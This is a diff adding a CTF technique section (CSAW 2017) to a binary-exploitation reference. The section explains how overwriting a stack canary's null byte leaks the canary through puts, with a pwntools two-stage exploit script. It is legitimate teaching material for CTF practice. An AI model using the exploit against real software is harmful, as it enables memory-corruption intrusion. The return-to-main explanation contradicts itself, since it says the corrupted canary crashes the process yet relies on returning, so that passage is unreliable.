@@ -16,6 +16,7 @@
 - [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
 - [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
 - [Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)](#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026)
+- [Stack Canary Null-Byte Overwrite Leak (CSAW 2017)](#stack-canary-null-byte-overwrite-leak-csaw-2017)
 
 ---
 
@@ -429,3 +430,39 @@ p.interactive()
 **When to recognize:** Challenge involves a custom parser for a binary file format (PCAP, ELF, image, protocol buffer). The parser uses `memcpy` or `read` with a length field from the input. Check if the buffer size is smaller than the maximum length the format allows.
 
 **References:** MetaCTF Flash CTF 2026 "PCAP Trap"
+
+---
+
+## Stack Canary Null-Byte Overwrite Leak (CSAW 2017)
+
+**Pattern:** Stack canaries always end with a null byte (the low byte is `\x00`) to prevent string-based leaks. If an overflow allows overwriting just that null byte with a non-null character, `puts()` or `printf("%s")` will continue printing past the overwritten byte and output the remaining 7 canary bytes. A return-to-main provides a second exploitation stage where the full canary is known.
+
+**Stack layout:**
+```text
+[buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [return addr]
+                  ^--- overwrite only this byte with 'A'
+                  → puts() now prints: 'A' + 7 canary bytes + (more stack data)
+```
+
+**Exploitation:**
+```python
+from pwn import *
+
+# Stage 1: Overwrite canary's null byte, leak remaining 7 bytes via puts
+p.send(b'A' * buf_size + b'B')   # 'B' overwrites the canary's null byte
+leak = p.recvline()
+# leak[buf_size] = 'B', leak[buf_size+1:buf_size+8] = 7 canary bytes
+canary = b'\x00' + leak[buf_size + 1: buf_size + 8]
+canary_val = u64(canary)
+log.info(f"Leaked canary: {hex(canary_val)}")
+
+# Stage 2: Return-to-main for clean second exploitation
+# First stage payload returned to main() — now build full ROP chain
+p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
+```
+
+**Why return-to-main:** After leaking the canary by overwriting its null byte, the canary is corrupted — the process will crash on return. Return-to-main (via a first-stage overflow) resets the stack frame cleanly and allows a second input with the now-known canary value.
+
+**Key insight:** The canary's null byte terminator is a weakness — overwriting only it makes string functions print the canary value. Return-to-main provides a second exploitation opportunity with the leaked canary, enabling full ROP chain construction.
+
+**References:** CSAW 2017
